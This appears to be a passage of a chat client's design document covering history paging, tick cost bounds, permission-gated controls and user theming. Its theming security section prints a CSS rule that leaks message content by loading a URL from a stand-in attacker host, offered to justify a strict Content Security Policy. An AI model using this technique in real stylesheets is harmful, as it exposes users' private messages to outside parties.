**History this machine holds and has not drawn** is a disk read. It is instant, it always
succeeds, and there is no reason to make somebody ask for it twice.

**History this machine does not hold** is `history_incomplete` — the chain stops because the
storage ceiling stopped it or because it is still arriving. Reaching it is a network round
trip that may not answer at all, which is why the existing control says *asked — it arrives
shortly* rather than pretending to have it.

They arrive at the same gesture and they are not the same promise, so they get different
ones: **local pages load on scroll, and the network boundary keeps its button.** Anything
else either makes a disk read look like it might fail, or makes a network fetch look like it
cannot.

This ordering is also a correctness constraint, not a preference. The network notice sits at
the top of the list and says *this machine is not holding older history*. Wired naively
behind a page, it would say that above ninety thousand records the machine is holding. **A
notice that is true of a node must not be rendered as a claim about a page.**

Which forces a fix this section owns rather than inherits: `history_incomplete` is node-wide.
It scans every held segment for one whose predecessor is missing, so a single truncated chain
anywhere lights the notice at the top of every channel. That was tolerable while it was the
only thing up there and vague in the same direction as the truth. It stops being tolerable
the moment a *local* boundary sits above it, because then the two contradict each other in
the same three lines. So a segment records the channel it was absorbed for, and the question
is asked per channel.

**A segment with no channel recorded counts toward every channel** — the answer this gave
before. The degradation is one-directional on purpose: it can say *incomplete* about a
channel that is whole, which is today's behaviour and merely vague, and it can never say
*whole* about a channel that is truncated, which would be the interface concealing exactly
the thing this notice exists to disclose.

#### The window keeps a loaded range, not a page

A page is what the store hands over. What the interface holds is the range it has drawn, and
almost everything below follows from that being the unit.

The range is defined by its ends, and **it only ever grows**. Scrolling up extends the older
end; it never slides, and nothing already drawn is taken away. So a reader who has gone back
a thousand messages keeps them, and the cost of that is bounded by one visit rather than by
the channel — it resets when they leave.

**The live range has one open end.** Its older end is a cursor and its newer end is *the
tail*, which is what makes new messages appear without anything asking for them.

#### A cursor is a merge-order key, and a clock reading is not one

The command has carried `before: Option<Hlc>` since it was written. That type cannot express
a page boundary correctly, and the bug it causes is silent.

Records are merged by reading and then by record id (`01` §4), because two records can carry
the same reading — the counter is per author *and device* (spec 07 §2.6), so two members
writing in the same millisecond collide legitimately and neither is wrong. When a page
boundary lands between such a pair, `before = that reading` excludes **both**: the one already
drawn and the one never drawn. A message disappears, no control reveals it, and every
individual layer is behaving exactly as written.

So a cursor is the pair the merge actually sorts on, and it comes from the one place that
defines that order rather than from a second copy of the comparator — the same discipline
that made the verdict fold assert against `kols_core::withheld` instead of reimplementing it.

**The interface never constructs one.** It receives cursors as opaque strings and hands them
back. An interface that could build a cursor could build a wrong one, and an HLC is exactly
the shape that invites arithmetic.

#### Anchoring, and the range that has left the tail

A pin, a reply, and eventually a search result (§7.6) all name a message rather than a
position, and none of them can be reached by scrolling to it. So a range may also be opened
**around** a cursor, and then it has two closed ends and is *detached*: it is a window onto
history rather than onto the present.

The read that answers this is not new machinery. Walking the index back from a cursor and
walking it forward from one are two queries against the index that already exists, and every
shape here composes from them — a page back is the first, a page around is both, and
re-reading a range is the second with a stopping point.

**A detached range must not reattach on its own**, which is the one thing that makes this
feature worth having rather than infuriating. Somebody who jumped to a message from last year
did so deliberately, and a live tick that silently returned them to the present two seconds
later would make the jump useless. Reattaching is a gesture — scrolling down to the tail, or
saying so — and never a timer. This is the same rule the scroll position already follows, now
applied to the data as well as to the viewport.

#### What the tick re-reads

`05` §3's standing discipline is *re-read rather than patch*: the projection is the core's,
and redrawing from it is what makes a duplicate delivery a non-event. Paging does not get an
exception, it gets a smaller argument.

The tick re-reads **the loaded range** — from its older cursor to its newer end, which for a
live range is the tail. Not the newest page.

The difference is decisive rather than stylistic, and it is `01` §4 again: **backfill lands in
the past.** A record recovered from a stale author's chain sorts where its author's clock puts
it, which is *inside* the loaded range and frequently nowhere near the bottom. A tick that
re-read only the newest page would never show it, and the message would sit in the store,
correctly ordered and permanently invisible, until something unrelated forced a redraw.

#### Marks come from the page you land on

§4.3 rests on a property paging removes: *everything is drawn, so what was here last time is
the complete answer, and there is no eviction policy to get wrong.* Draw one page and the
remembered set quietly becomes partial — and every message on the pages below it reads as
never seen, for good.

The rule that keeps §4.3 true is its own, applied one level down. Its first commitment is that
first sight of a channel marks nothing, because *no idea* is the honest reading of a channel
this machine has never displayed, and the alternative sets a hundred messages of backlog
alight on the day somebody joins. **A page this machine has never displayed is the same
claim about a smaller thing.**

So: the page a visit *lands on* produces marks, exactly as §4.3 describes. Pages reached by
**scrolling back** file their ids and mark nothing. Going back into history is navigation, and
nothing you navigated to deliberately is an arrival.

Stated that way round rather than as *a page absent from the stored set marks nothing*, which
sounds equivalent and is not: a busy channel can turn over an entire screenful between visits,
and that reading would mark nothing in precisely the case §4.3 exists for. What separates them
is how the page was reached, which the interface knows and the contents cannot tell it.

The remembered set is then the union of what was drawn across a visit, replaced at the start
of the next one. Still bounded by the channel, still no eviction policy.

#### Two things that stay whole-channel, and one that is local

**The author count stays whole-channel.** It is a `COUNT(DISTINCT author)` against the index —
cheap — and a number that changed as somebody scrolled would be worse than the query it saved.

**Refusals become the page's**, and the interface says so. `05` §3's reason for surfacing them
at all is that a record this node refuses is one another client may be showing, and silence
would make the two look like they agree; a count that is honest about its scope keeps that,
and a whole-channel count would mean reading the whole channel, which is the thing being
removed.

**Page size is local, never network policy** — presentation, like the fetch concurrency
Storage §4.4 keeps per node. It is safe to be local only because of a property already built:
the rate verdict is folded over the whole channel and stored, so *what renders cannot depend
on how much was loaded*. Without that, page size would silently be a policy knob, and two
members reading the same channel at different page sizes would see different messages —
the divergence `01` §10.1 makes these limits network policy to prevent, arriving through a
presentation setting.

#### Built 2026-09-09

All of the above, and three things the building of it settled that the design above had not.

**The reach limit belongs where untrusted input arrives.** It began in the store, which then
silently truncated a deliberate whole-channel read to five hundred records — the terminal would
have shown the end of a channel and said nothing about the rest. A ceiling that quietly rewrites
what a caller asked for is the same failure as a boundary that drops a message: the answer is
wrong and nothing reveals it. The window's requests are clamped at the boundary they arrive
through; inside the process, callers ask for what they mean.

**Restoring the scroll position turned out to be a fix in its own right.** Emptying the list to
redraw it clamps the scroll to the top and does not put it back, so a reader scrolled up was
thrown to the top by every redraw that changed anything — every two seconds on a busy channel.
That was true before paging and is why scrolling up has never been worth doing in this client.

**The first-sight rule needed the previous tail, not just the gesture.** Marking nothing on a
draw that reached backwards is almost right, and loses a message: one arriving in the same two
seconds as the reach would be filed as seen without ever being marked, and nothing would come
back for it. So the split is at the last message previously drawn — everything after it arrived,
everything before it is history — and the gesture decides only what happens on the older side.

#### The tick may not grow at all, and that is a stronger claim than a fast one

Paging made a page cost a page. It did not make the **tick** bounded, and those are different
properties: the first is about what is drawn, the second is about what is examined to decide
nothing needs drawing.

The distinction matters because this is the control that runs every two seconds for as long as
somebody has a channel open. **It is the same argument as the storage ceiling, about the other
resource.** A client whose disk use grows without a bound is one that eventually stops working;
so is one whose per-tick cost does. That a chat client is unusable after two years is not a
smaller failure for being a slower one.

**Measured flat is not bounded.** The first paged implementation cost 3.6 ms at five hundred
records and 6.1 ms at eight thousand, which reads as flat and is linear — the curve only appears
at a scale nobody tests at, which is to say in somebody's client after two years of use. A
timing measurement cannot express *bounded*; it can only fail to notice.

So the guarantee is a **count of work**, asserted rather than measured: directory entries
enumerated, files read, records decoded. If those numbers are identical at two hundred records
and at three thousand, they are identical at a hundred thousand, and nothing is being trusted to
spot a curve.

**Five things on that path grew, and all five had the same shape**: answering *has anything
changed* by examining everything that might have. Reading every record file and decoding it;
then listing the record directory; then a `COUNT(*)`; a `COUNT(DISTINCT author)`; a listing and
sort of the entire governance log; and a mark read per held segment. Each was a reasonable
saving over the one before it, and each left the growth in place one layer down.

**One primitive answers all of them: a file that only ever grows, whose *length* is the signal.**
It is read with a `stat`, without opening it. It is monotonic. And unlike a counter written by
read-modify-write, two writers cannot lose one another's update — which is the failure that
would matter, because a marker returning to a value a reader had already seen would make that
reader skip a record permanently.

The signal has to live in the filesystem rather than in memory, and that is forced rather than
chosen: `serve` opens its **own** handle on the same store, so a counter held by one would never
see the other's writes.

It is used three times, and the third use is the one that shows the shape is right:

- **Records** append their id, so the log's length is the channel's record count *and* its tail
  is exactly what is new — no listing, and no diff against what is already held.
- **Governance entries** append one byte. Here the tally is a change signal and never a count:
  nothing derives a filename from it, so two handles appending at once cost a rebuild rather
  than an entry. Numbering still costs a listing, on the path that runs when somebody governs
  rather than the one that runs every two seconds.
- **Segments** append one byte when a link is written, which is the only event that can change
  whether a channel's history has a hole — shedding deliberately leaves links alone, so that a
  member who gave up a servable copy does not appear to have lost history.

The two whole-channel numbers a read needs — how many records, how many authors — are **kept**
rather than counted, in the fold's own row. Whether an arriving author is new is a seek on the
author key, bounded by the roster rather than by history.

**What the settled tick costs, then: no directory listings at all, and one file read per record
in the page plus the records acting on it.** Fifty-two reads for a page of fifty, at five
hundred records and at eight thousand alike.

**The costs of this, stated rather than buried.** The arrival log is 32 bytes a record — about
3 MB in a channel with a hundred thousand messages, beside records that are hundreds of bytes
each. It relies on `O_APPEND` making a small write atomic against other appenders, which is a
strictly smaller assumption than the atomic `rename` the whole store already rests on, and is
not promised by POSIX for arbitrary sizes. And it is one more derived thing that can be wrong: a
crash between the append and the record write leaves an id naming nothing, which the fold skips
and a rebuild repairs. Every path that repairs it lists a directory, and every one of them runs
off the tick.

#### What this owes its own tests

**The boundedness above is a test rather than a measurement**, and it is what keeps this
foundational: `a_settled_read_costs_the_same_at_any_size` grows a channel from two hundred
records to three thousand, adds forty governance entries and forty held segments, and asserts
the work counters are *equal*. It also asks for a smaller page and asserts that costs less,
because constant is not the whole claim — a read that examined nothing would be constant too.

jsdom applies no layout, so `scrollHeight`, `scrollTop` and `clientHeight` are all zero there
and nothing about scrolling can be observed in the harness this interface has. That decides
the shape rather than excusing it: **the loaded range is pure state with pure transitions,
and the DOM layer only feeds it numbers.** What is worth asserting — that a range grows and
never slides, that a detached one does not reattach on a tick, that scrolling back marks
nothing, that a boundary between two records sharing a reading loses neither — is then
answerable without a viewport.

---

## 5. Chrome Follows Permission

Controls for actions a user cannot perform are not shown — invite creation being the first
case, since a member without the capability has no use for the button.

**Hiding is presentation, never enforcement.** `05` §3's first property is that there is no
ambient authority: every command names its target and the core re-checks permission on
receipt, rather than trusting that the interface only offered buttons the user was allowed
to press. The hidden button and the refused command are independent, and the second is the
one that matters. This is written down because a hidden control looks like a check and is
not one.

**That half is built, and it refuses in the type system rather than at review time.** The
gate hands back a value with no public constructor, so an executor cannot receive a command
that skipped it (D25).

**The presentation half is built too, and it asks the gate's own question rather than keeping a
second copy of the answer.** The shell resolves each capability against replayed state and hands
the interface a flag per control — `may_post`, `may_create_channel`, `may_invite` — so a member
without `approve-node` is shown no door, and a member without `chat:create-channel` no `+`.
There is no second permission model in the front end to drift from the first.

### 5.1 Asking *whether* is native; asking *what* is not

§6.5 requires that anything asking a member to **authorise** something be a native dialog,
outside the document a theme can reach — a theme may hide, move, cover or shrink any element,
so a confirmation it can conceal is not one. That is a rule about approval, and the
destructive confirmations keep `window.confirm`, which is browser chrome and outside the DOM
by construction.

**Asking what to do is a different act, and collapsing the two costs something real.** Naming
a channel, choosing a verb, picking a scope, typing a new name into a sidebar row — none of it
approves anything, and a theme that restyled it can at worst make its owner's client awkward.
Held to the native rule, all of that becomes the operating system's idea of a text field: the
`prompt` this client used for every one of them rendered as a grey box titled *"JavaScript —
tauri://localhost"*, which is both unthemeable and unrecognisable as part of the application.

So the line runs between the two questions rather than around every dialog. Data entry lives
in the document, styled like the rest of the interface and fully themeable. Approval stays
native. Stated here because the rule is easy to read as *"dialogs are native"*, which is
stricter than §6.5 asks and makes the interface worse for nothing.

**A third, and it is about what a width may depend on.** An icon typed as a character is
sized by whichever font on the machine happens to carry it. `⋯` (U+22EF) is absent from Segoe
UI, so Windows fell back to something far wider, the handle took most of the row, and the
channel names were squeezed to nothing — the same visible symptom as the sizing bug below, from
a different cause, which is why fixing that one did not fix this. Two rules follow, and the
second is the one worth keeping: **draw an icon rather than typing it**, and where a control
sits beside text that may shrink, **take the control out of flow and reserve its space with
padding** so the text's width cannot depend on the control's at all. Correct arithmetic is not
the same as no arithmetic.

**And a rule about what a control may be built on.** Reordering channels was drag-and-drop and
nothing else, and drag-and-drop had never once worked in the shipped application. The front end
was right throughout — dispatching `dragstart`, `dragover` and `drop` by hand runs the whole
path and reaches the command — and the events simply never arrived, because Tauri installs a
native drag handler on the webview by default and it takes the drag first (`05` §1). So for as
long as folders have existed there was no way to reorder a channel, and nothing in the interface
said so.

**What a drop may land on, once it works.** Two things came back from the first drag that
actually ran, and both are about targets rather than about dragging. A row meant *before this
one*, so a list of five channels had five places to drop and six places to want one — there was
no way to say *last*. Every row is two targets now, split at its midpoint, which answers the
question people are really asking: above or below the thing I am pointing at. And with every
channel filed into folders there was **no element on screen that meant top level**, so a sidebar
could be arranged into a state nothing could be dragged out of. The sidebar's own empty space is
that target, which is the area somebody aims at when they mean "out here" anyway.

The general shape: a drag needs a target for every *destination*, not for every *thing*. The
destinations here are before a row, after a row, inside a folder, and out at the top level, and
three of the four were reachable.

The rule this leaves is not about drag. **A capability whose only route is one nobody can verify
has no route.** Reordering had exactly one, it depended on a layer below the interface, and the
interface had no way to notice it was gone. So the menu keeps **move up** and **move down** now
that the drag works: they are the route that can be tested, and a drag is a gesture some people
cannot make while every other control here is reachable without one.

**The control this was learned on is gone**, and the rules are kept because they were never
about it. The handle existed for discoverability — the right-click menu was the only way to
reach channel controls, and the first field test came back asking for controls that had shipped
weeks earlier. Three rounds of platform bugs later the same tester, now knowing the menu is
there, asked for it removed: one way to a menu is enough. That is their call and it is made.
What stays is the reason a sidebar is a bad place to learn CSS sizing in, and §7.1's question
of what earns permanent space in the frame — to which the answer has now been *no* three times
running.

**A second sizing rule, learned the same way.** A flex row whose item carries `width: 100%`
gets a flex basis of the whole row, so the row overflows by whatever sits beside it and both
items shrink. How far an item *may* shrink is its min-content width — and `overflow-wrap:
anywhere` reduces min-content to the widest single glyph, which `break-word` deliberately does
not. Put together: adding a menu handle beside a channel name turned the sidebar into columns
of one letter per line. It reproduced on Windows and not on macOS, because how much the row
overflows by depends on how wide the handle renders, which is a font question — so the engine
decided whether the bug was visible and not whether it was there. Size flex items from `0`
rather than `auto` when they carry a percentage width, and prefer an ellipsis to wrapping in a
column 260px wide.

**One thing the interface must not get wrong about hiding, learned by getting it wrong.**
`hidden` is an attribute, and the browser's `[hidden] { display: none }` is the weakest rule
there is — so any rule setting `display` beats it. The picker rendered correctly with the
channel screen sitting *underneath* it, reachable by scrolling, because `.app { display: grid }`
won. `[hidden] { display: none !important }` is the fix, and the `!important` is right exactly
here: hiding is not a style choice a later rule may reasonably override, and a theme (§6) must
never be able to reveal a screen this client decided you are not on.

---

## 6. Theming

The client is themeable by its user, in the spirit of a personal page rather than a colour
picker. Themes are **local and visual only**: they change how this installation looks, never
what it does, and never anything another user sees.

### 6.1 What Is Themeable

Full restyling, including layout — position, size, spacing, and hiding elements. A user who
wants to rearrange or break their own client may. **Reset to default is therefore mandatory
and must be reachable without the theme's cooperation**, since a theme can hide the control
that would undo it.

**CSS only. Not HTML.** HTML means either script execution or a sanitiser, and sanitisers
are a permanent arms race. CSS under the policy below is a bounded problem with a complete
answer. This is a starting position, not a permanent ceiling — but structural customisation,
if wanted later, should arrive as layout slots and custom properties rather than as
injection.

### 6.2 The Security Argument, In Full

**CSS can exfiltrate data, and this is not theoretical.** Attribute selectors combined with
any URL-loading property turn a stylesheet into a data channel:

```css
.message[data-content^="secret"] { background: url(https://evil.example/leak-s); }
```

In a chat client that reaches message content, member names and channel names.

**CSS has exactly one way to leak: causing a network request.** `url()`, `@import` and
`@font-face src` are the complete set, and all three are subject to Content Security Policy.
Under a CSP that permits **no remote origins at all**, arbitrary user CSS cannot phone home
— not "is unlikely to", cannot. There is no second channel. Fonts ship locally; images come
from local files or `data:` URIs, which make no request.

This is why the answer to "is arbitrary user CSS safe" is yes *conditionally*, and the
condition is the whole of it.

**What CSP does not solve is spoofing.** A theme can hide or fake chrome, and App Hosting
§3.3 requires a consent prompt before any signed action in the sandboxed build. A theme that
can conceal that prompt is a serious problem, and no styling policy fixes it.

The fix is structural rather than restrictive: **security-critical surfaces render as native
Tauri dialogs, outside the themeable DOM entirely.** The consent prompt, the identity
display and the permission surface are not part of the document a theme can reach. A theme
may make the application unrecognisable and can never fake a signature prompt.

**This work is not specific to theming.** The sandbox path (`05` §7) needs the same CSP
discipline for hosted apps, so it would be built regardless.

### 6.3 Themes as Directories

A theme is a directory: `theme.css`, local assets, and a small manifest naming it and its
author. They live in the application data directory, are switched by swapping the active
stylesheet, and are saved and re-selected freely.

Sharing theme files is fine — the CSP is what makes it safe, not the provenance of the file
— but **importing one is an explicit action**, never silent, because a theme that
rearranges the interface is something a user should choose deliberately.

### 6.4 Reset Takes Two Doors, Because One of Them Is Inside the Room

§6.1 makes reset mandatory and requires it to work without the theme's cooperation. That is a
stronger constraint than it first reads: a theme may hide, move, cover, or shrink to nothing
any element in the document, so **no control inside the document can be the way out of a
theme.** A "reset" button a theme can `display: none` is not a reset, it is a reassurance.

Two doors are required, because they survive different failures (D37):

1. **A native application menu item.** Outside the document, unstyleable, and the ordinary
   path — this is the one people will actually use. It survives a theme that hides things.
2. **A launch flag that applies no theme at all.** It survives a theme that makes the window
   unusable before a menu can be reached, which a menu item cannot help with.

A keyboard shortcut is worth offering and is **not** the guarantee: it is undiscoverable at the
moment it is needed, which is the moment somebody is looking at an unreadable window and has
not read this document.

The same reasoning already exists one layer down. D30 keeps the terminal as the reference path
when the window misbehaves; this is that principle applied to the window's own appearance.

### 6.5 What Must Leave the Document Before a Theme Can Reach It

§6.2's structural fix is a **precondition of shipping theming**, not a follow-up to it. Two
things have to be true first.

**The network a member is looking at must not be themeable.** This is the spoof that matters
here, and it is specific to this application rather than general UI caution: networks are the
privacy boundary D29 exists to protect, so a theme that makes one network resemble another does
not cause confusion — it causes a message written into the wrong network, which is the exact
failure the unlinkability design is built to prevent. The remedy is cheap: **the window title
carries the network and the identity**, it is native chrome, and no stylesheet reaches it.

**Anything that asks a member to authorise something must be a native dialog.** Today the
confirmations are `window.confirm`, which is browser chrome rather than document, so this
already holds — by accident rather than by decision, which is worth converting into a decision
before a theme is around to test it. When App Hosting §3.3's consent prompt arrives for the
sandbox path, it inherits this requirement rather than discovering it.

Note what is *not* on this list. Permission-gated chrome (§5) stays in the document and stays
themeable: a theme that hides a control the member holds is self-inflicted, and a theme that
fabricates one grants nothing, because every command is re-checked on receipt and a button is
not a capability.

---

## 7. Open Questions

1. ~~**Navigation shape.**~~ **Answered 2026-09-11 by §1.1, and the answer keeps the one this
   question already had.** What it actually held was whether a fourth thing ever earns permanent
   space in the frame, and three field tests said no. It still says no: the workspace did not
   get a column, it got a **window**, and the channel rail, the roster dropdown, the door as a
   sheet and settings as a screen are all untouched. What decides the split is not a layout but
   `05` §3.1's line — an act about one network belongs to that network's window, an act about
   the set of them belongs to the workspace's — which is also the test for whatever gets
   proposed next.
2. **The invite flow's remaining choices.** Built: an `approve-node` holder mints an invite,
   copies one string, watches the waiting room and admits from it, and a joiner who lands in
   the waiting room is told that is a success rather than shown an empty network. Still
   defaulted rather than decided: **use-count and expiry**, currently one join and
   twenty-four hours with nothing in the interface to change them — a founder inviting six
   people has to mint six times, which is a decision nobody made.
3. ~~**How a warm network surfaces activity.**~~ **Answered 2026-09-11 by §1.3.** The
   per-network count lives on the workspace window's row; a network window's title keeps carrying only its own
   open network, because D36 made it the one piece of native chrome saying which network you
   are in and a cross-network total blunts that; and the attention request stays per-window
   and names nothing, since it comes from an operating system with no opinion about networks.
   Answering it added an honesty rule this question had not anticipated: §2's **cold** tier is
   polled, so a cold row's count is as old as its last poll and the row says when it looked —
   a `0` there otherwise asserts the absence of news nobody went and asked for.
4. ~~**What "recent" means for warm tier membership.**~~ **Closed 2026-09-10 by removing the question rather than answering it.** Warm is now the default for everything joined, and *set aside* is an explicit per-network choice — so there is no recency rule to write and no set the client has inferred. §2 carries the reasoning.
5. **Attachment and media presentation**, including whether a theme may restyle inline media.
6. **Search surface** — `05` §3 has the command; where results live is undecided. What a result
   does when opened is no longer part of that question: §4.4 opens a range *around* a cursor, so a
   result has somewhere to land, and this narrows to where the list of them lives.
7. **Multi-device** (`05` §6) is designed and unbuilt; read state becomes shared when it
   lands, and the interface should not assume it is local forever.
8. **A governance surface.** Roles, membership, moderation and the waiting room are one
   subject and currently live in three places, with permissions parked in §4.2's settings
   sheet because nowhere better exists. What that surface is, and whether settings keeps a
   pointer to it or loses the section entirely, is undecided.
